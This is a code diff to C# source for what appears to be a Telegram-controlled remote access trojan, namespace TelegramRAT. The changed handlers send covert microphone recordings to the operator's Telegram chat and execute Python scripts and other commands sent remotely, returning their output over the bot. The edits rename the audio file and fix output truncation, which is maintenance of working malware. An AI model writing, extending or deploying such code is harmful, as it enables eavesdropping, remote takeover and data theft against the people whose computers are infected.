@@ -1325,7 +1325,7 @@ namespace TelegramRAT
 
                             memstrm.Position = 0;
 
-                            Bot.SendAudioAsync(update.Message.Chat.Id, new InputOnlineFile(memstrm, fileName: "aboba"), replyToMessageId: update.Message.MessageId).Wait();
+                            Bot.SendAudioAsync(update.Message.Chat.Id, new InputOnlineFile(memstrm, fileName: "record"), replyToMessageId: update.Message.MessageId).Wait();
 
                             waveIn2.Dispose();
                             memstrm.Close();
@@ -1545,10 +1545,11 @@ namespace TelegramRAT
 
                                 pythonEngine.Execute(model.RawArgs, pythonScope);
                                 pyStream.Position = 0;
-
+                                
                                 if (pyStream.Length > 0)
                                 {
-                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, $"Executed! Output:\n{new StreamReader(pyStream).ReadToEnd().Take(4096)}", replyToMessageId: update.Message.MessageId);
+                                    string output = string.Join(string.Empty, new StreamReader(pyStream).ReadToEnd().Take(4096).ToArray());
+                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, $"Executed! Output:\n{output}", replyToMessageId: update.Message.MessageId);
                                 }
                                 else
                                 {
@@ -1577,10 +1578,11 @@ namespace TelegramRAT
 
                                 outputStream.Position = 0;
 
-                                string outputText = new StreamReader(outputStream).ReadToEnd();
+                                string outputText = string.Join(string.Empty, new StreamReader(outputStream).ReadToEnd().Take(4096));
+                                
 
                                 if (outputText.Length > 0)
-                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, $"Executed! Output: {outputText.Take(4096)}", replyToMessageId: update.Message.MessageId);
+                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, $"Executed! Output: {outputText}", replyToMessageId: update.Message.MessageId);
                                 else
                                     Bot.SendTextMessageAsync(update.Message.Chat.Id, $"Executed!", replyToMessageId: update.Message.MessageId);
 
